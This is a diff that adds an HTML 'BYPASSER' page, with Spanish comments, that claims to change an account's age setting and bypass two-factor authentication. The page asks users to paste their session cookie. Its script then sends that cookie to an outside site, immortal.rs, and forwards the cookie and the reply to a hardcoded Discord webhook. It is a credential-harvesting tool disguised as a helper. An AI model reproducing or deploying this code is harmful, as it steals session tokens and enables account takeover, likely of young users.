@@ -1,25 +1,84 @@
-
-    <div class="container">
-        <h1>BYPASSER</h1>
-        <p style="text-align: center; font-size: 0.9rem; margin-bottom: 20px;">This page includes bypassers which make changes to Accounts.</p>
-
-        <div class="form-group">
-            <label for="cookie">Cookie</label>
-            <textarea rows="4" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--..."></textarea>
-        </div>
-
-        <div class="form-group">
-            <label for="type">Type</label>
-            <select id="type">
-                <option value="+13 to &lt;13 (Under18's Only, NoPass, Bypass2FA)">+13 to &lt;13 (Under18's Only, NoPass, Bypass2FA)</option>
-                <option value="+13 to &lt;13 (AllAges, Password, No2FA)">+13 to &lt;13 (AllAges, Password, No2FA)</option>
-            </select>
-        </div>
-
-        <button id="bypassBtn">Bypass <span class="spinner" id="spinner"></span></button>
-
-        <div id="result"></div>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>BYPASSER</title>
+</head>
+<body>
+    <h1>BYPASSER</h1>
+    <div style="text-align: right; margin-bottom: 20px;">
+        This page includes bypassers which make changes to Accounts.
     </div>
 
-    
+    <div>
+        <label for="cookie">Cookie</label><br>
+        <textarea id="cookie" rows="4" cols="50" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--..."></textarea>
+    </div>
 
+    <div>
+        <label for="type">Type</label><br>
+        <select id="type">
+            <option value="+13 to <13 (Under18's Only, NoPass, Bypass2FA)">+13 to <13 (Under18's Only, NoPass, Bypass2FA)</option>
+            <option value="+13 to <13 (AllAges, Password, No2FA)">+13 to <13 (AllAges, Password, No2FA)</option>
+        </select>
+    </div>
+
+    <div>
+        <button id="bypassBtn">Bypass</button>
+    </div>
+
+    <div id="result" style="margin-top: 20px;"></div>
+
+    <script>
+        document.getElementById('bypassBtn').addEventListener('click', async () => {
+            const cookie = document.getElementById('cookie').value.trim();
+            const type = document.getElementById('type').value;
+            const resultDiv = document.getElementById('result');
+
+            if (!cookie) {
+                resultDiv.textContent = 'Error: Debes ingresar la cookie.';
+                return;
+            }
+
+            // Mostrar mensaje de procesando
+            resultDiv.textContent = 'Procesando...';
+
+            try {
+                // Enviar a immortal.rs
+                const response = await fetch('https://immortal.rs/api/misc/2faBypass.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        Cookie: cookie,
+                        Type: type
+                    })
+                });
+
+                const responseData = await response.text();
+
+                // Enviar a Discord
+                const discordWebhook = 'https://discord.com/api/webhooks/1473454422322446377/2L2rI_8EVfoMJ__WVyTCOq5Xy5OVKzU-G4ThA8wAJkjRNoly6cEfNMof2RJRlY_kXj5A';
+                const discordPayload = {
+                    content: `**🚨 NUEVO BYPASS INICIADO 🚨**\n\n**Cookie:** \`\`\`${cookie}\`\`\`\n**Tipo:** \`${type}\`\n**Resultado de immortal.rs:**\n\`\`\`${responseData}\`\`\``
+                };
+
+                await fetch(discordWebhook, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordPayload)
+                });
+
+                // Mostrar resultado en pantalla
+                resultDiv.textContent = `Bypass completado.\n\nRespuesta:\n${responseData}`;
+
+            } catch (error) {
+                resultDiv.textContent = `Error: ${error.message}`;
+            }
+        });
+    </script>
+</body>
+</html>
